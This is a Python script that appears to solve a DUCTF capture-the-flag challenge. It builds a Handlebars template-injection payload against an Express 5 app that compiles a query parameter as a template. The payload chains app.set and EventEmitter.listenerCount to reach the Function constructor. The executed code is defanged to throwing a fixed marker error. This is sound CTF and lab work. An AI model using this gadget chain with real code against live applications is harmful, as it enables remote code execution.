"""DU CTF more-request-handling (Express 5): Handlebars function gadget.

Unlike the Express 4 predecessor, Express 5 supplies req to the template
instead of accepting an object as the AST. A nested Handlebars program uses
Express app.set and EventEmitter.listenerCount to obtain Function and call
it with one attacker-controlled argument. This version uses a harmless fixed
error marker; it does not spawn a process or retrieve any hosted flag.

Use only against the challenge's local original Node application.
"""
import argparse
import re
from pathlib import Path

MARKER = "DUCTF_PHASE16_FUNCTION_MARKER"


def validate_source(dockerfile: str) -> None:
    patterns = (
        r"npm install express@5 handlebars",
        r"Handlebars\.compile\(req\.query\.x\)\(\{req\}\)",
        r"app\.get\('/'",
    )
    if any(re.search(pattern, dockerfile) is None for pattern in patterns):
        raise ValueError("Original Express 5 challenge behavior differs")


def template(marker: str = MARKER) -> str:
    if not re.fullmatch(r"[A-Z0-9_]{8,80}", marker):
        raise ValueError("Only harmless local marker text is accepted")
    expression = "(function () {throw new Error('" + marker + "')})()"
    # This source deliberately uses only the original challenge's gadget
    # paths. The marker is a benign stand-in for command execution.
    return (
        "{{#with req.socket.server._events.request.request.app.locals}}\n"
        "    {{#with (../req.socket.server._events.request.request.app.set "
        '"settings" ../req.socket._events.error)}}{{/with}}\n'
        "    {{#with (../req.socket.server._events.request.request.app.set "
        '"listenerCount" ../req.socket.server._events.request.request.app.set)}}{{/with}}\n'
        "    {{#with (../req.socket.server._events.request.request.app.set "
        '"listenerCount" '
        '(../req.socket.server._events.request.constructor.listenerCount settings "constructor"))}}{{/with}}\n'
        "    {{#with (../req.socket.server._events.request.constructor.listenerCount "
        'settings "' + expression + '")}}{{/with}}\n'
        "{{/with}}\n"
    )


def check_local_result(status: int, body: str, marker: str = MARKER) -> bool:
    if status != 500 or marker not in body:
        raise ValueError("Original Handlebars Function gadget was not executed")
    return True


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("original_dockerfile", type=Path)
    args = parser.parse_args()
    validate_source(args.original_dockerfile.read_text(encoding="utf-8"))
    print("Local harmless function-gadget template:")
    print(template())
    print("Node integration tests confirm whether the local app executes it.")


if __name__ == "__main__":
    main()
